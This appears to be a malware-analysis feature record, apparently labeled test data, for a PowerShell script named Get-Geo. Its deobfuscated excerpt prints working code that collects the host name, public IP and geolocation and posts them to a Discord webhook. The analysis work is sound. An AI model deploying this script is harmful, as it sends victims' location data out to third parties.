@@ -1,0 +1,83 @@
+{
+  "meta": {
+    "quelldatei": "tech_028_Get-Geo.ps1",
+    "sha256": "025f2ed6643cc0eeb7ebe0c9c6ece8c71ce97bfe6a3bcc63f07b70b7f228256c",
+    "groesse_bytes": 1952,
+    "zeilen": 53,
+    "ground_truth_label": "techniques",
+    "analyse_gekuerzt": false,
+    "hinweis": "Kein Urteil enthalten. Bewertung erfolgt durch das LLM."
+  },
+  "stufe1_extract": {
+    "strings": [
+      "\r\n    )\r\n\r\n    $ipInfoApiUrl = ",
+      "\r\n    $hostname = [System.Net.Dns]::GetHostName()\r\n\r\n    try {\r\n        $response = Invoke-RestMethod -Uri $ipInfoApiUrl -Method Get\r\n        if ($response.status -eq 'success') {\r\n            $geoData = @{\r\n                'IP'          = $response.query\r\n                'Country'     = $response.country\r\n                'Region'      = $response.regionName\r\n                'City'        = $response.city\r\n                'Latitude'    = $response.lat\r\n                'Longitude'   = $response.lon\r\n                'TimeZone'    = $response.timezone\r\n                'ISP'         = $response.isp\r\n            }\r\n            $geoLocation = New-Object PSObject -Property $geoData\r\n\r\n            if ($wb -ne ",
+      ") {\r\n                $discordData = @{\r\n                    'content' = ",
+      "\r\n                } | ConvertTo-Json\r\n\r\n                Invoke-RestMethod -Uri $wb -Method Post -Body $discordData -Headers @{\r\n                    'Content-Type' = 'application/json'\r\n                }\r\n            }\r\n        }\r\n        else {\r\n            Write-Error ",
+      "\r\n        }\r\n    }\r\n    catch {\r\n        Write-Error ",
+      "\r\n    }\r\n}\r\n\r\n\r\n#Get-Geo -wb "
+    ],
+    "string_anzahl_gesamt": 6,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0
+  },
+  "stufe2_features": {
+    "strings": [
+      "\r\n    )\r\n\r\n    $ipInfoApiUrl = ",
+      "\r\n    $hostname = [System.Net.Dns]::GetHostName()\r\n\r\n    try {\r\n        $response = Invoke-RestMethod -Uri $ipInfoApiUrl -Method Get\r\n        if ($response.status -eq 'success') {\r\n            $geoData = @{\r\n                'IP'          = $response.query\r\n                'Country'     = $response.country\r\n                'Region'      = $response.regionName\r\n                'City'        = $response.city\r\n                'Latitude'    = $response.lat\r\n                'Longitude'   = $response.lon\r\n                'TimeZone'    = $response.timezone\r\n                'ISP'         = $response.isp\r\n            }\r\n            $geoLocation = New-Object PSObject -Property $geoData\r\n\r\n            if ($wb -ne ",
+      ") {\r\n                $discordData = @{\r\n                    'content' = ",
+      "\r\n                } | ConvertTo-Json\r\n\r\n                Invoke-RestMethod -Uri $wb -Method Post -Body $discordData -Headers @{\r\n                    'Content-Type' = 'application/json'\r\n                }\r\n            }\r\n        }\r\n        else {\r\n            Write-Error ",
+      "\r\n        }\r\n    }\r\n    catch {\r\n        Write-Error ",
+      "\r\n    }\r\n}\r\n\r\n\r\n#Get-Geo -wb "
+    ],
+    "string_anzahl_gesamt": 6,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Content-Type",
+      "Get-Geo",
+      "Invoke-RestMethod",
+      "New-Object",
+      "Write-Error"
+    ],
+    "auffaellige_tokens": {},
+    "iocs": {
+      "urls": [
+        "http://ip-api.com/json"
+      ],
+      "ipv4": [],
+      "pfade": []
+    }
+  },
+  "stufe3_structure": {
+    "strings": [
+      "\r\n    )\r\n\r\n    $ipInfoApiUrl = ",
+      "\r\n    $hostname = [System.Net.Dns]::GetHostName()\r\n\r\n    try {\r\n        $response = Invoke-RestMethod -Uri $ipInfoApiUrl -Method Get\r\n        if ($response.status -eq 'success') {\r\n            $geoData = @{\r\n                'IP'          = $response.query\r\n                'Country'     = $response.country\r\n                'Region'      = $response.regionName\r\n                'City'        = $response.city\r\n                'Latitude'    = $response.lat\r\n                'Longitude'   = $response.lon\r\n                'TimeZone'    = $response.timezone\r\n                'ISP'         = $response.isp\r\n            }\r\n            $geoLocation = New-Object PSObject -Property $geoData\r\n\r\n            if ($wb -ne ",
+      ") {\r\n                $discordData = @{\r\n                    'content' = ",
+      "\r\n                } | ConvertTo-Json\r\n\r\n                Invoke-RestMethod -Uri $wb -Method Post -Body $discordData -Headers @{\r\n                    'Content-Type' = 'application/json'\r\n                }\r\n            }\r\n        }\r\n        else {\r\n            Write-Error ",
+      "\r\n        }\r\n    }\r\n    catch {\r\n        Write-Error ",
+      "\r\n    }\r\n}\r\n\r\n\r\n#Get-Geo -wb "
+    ],
+    "string_anzahl_gesamt": 6,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Content-Type",
+      "Get-Geo",
+      "Invoke-RestMethod",
+      "New-Object",
+      "Write-Error"
+    ],
+    "auffaellige_tokens": {},
+    "iocs": {
+      "urls": [
+        "http://ip-api.com/json"
+      ],
+      "ipv4": [],
+      "pfade": []
+    },
+    "deobfuskiert_auszug": "function Get-Geo {\r\n    Param (\r\n        [string]$wb = \"\"\r\n    )\r\n\r\n    $ipInfoApiUrl = \"http://ip-api.com/json\"\r\n    $hostname = [System.Net.Dns]::GetHostName()\r\n\r\n    try {\r\n        $response = Invoke-RestMethod -Uri $ipInfoApiUrl -Method Get\r\n        if ($response.status -eq 'success') {\r\n            $geoData = @{\r\n                'IP'          = $response.query\r\n                'Country'     = $response.country\r\n                'Region'      = $response.regionName\r\n                'City'        = $response.city\r\n                'Latitude'    = $response.lat\r\n                'Longitude'   = $response.lon\r\n                'TimeZone'    = $response.timezone\r\n                'ISP'         = $response.isp\r\n            }\r\n            $geoLocation = New-Object PSObject -Property $geoData\r\n\r\n            if ($wb -ne \"\") {\r\n                $discordData = @{\r\n                    'content' = \"**Hostname:** $hostname\r\n                                **IP Address:** $($geoLocation.IP)\r\n                                **Country:** $($geoLocation.Country)\r\n                                **Region:** $($geoLocation.Region)\r\n                                **City:** $($geoLocation.City)\r\n                                **Latitude:** $($geoLocation.Latitude)\r\n                                **Longitude:** $($geoLocation.Longitude)\r\n                                **Time Zone:** $($geoLocation.TimeZone)\r\n                                **ISP:** $($geoLocation.ISP)\"\r\n                } | ConvertTo-Json\r\n\r\n                Invoke-RestMethod -Uri $wb -Method Post -Body $discordData -Headers @{\r\n                    'Content-Type' = 'application/json'\r\n                }\r\n            }\r\n        }\r\n        else {\r\n            Write-Error \"Failed to retrieve geolocation information.\"\r\n        }\r\n    }\r\n    catch {\r\n        Write-Error \"An error occurred while trying to fetch geolocation data: $_\"\r\n    }\r\n}\r\n\r\n\r\n#Get-Geo -wb \"YOUR WEBOOK HERE\"\r\n",
+    "dekodierte_befehle": [],
+    "beobachtete_abfolge": []
+  }
+}
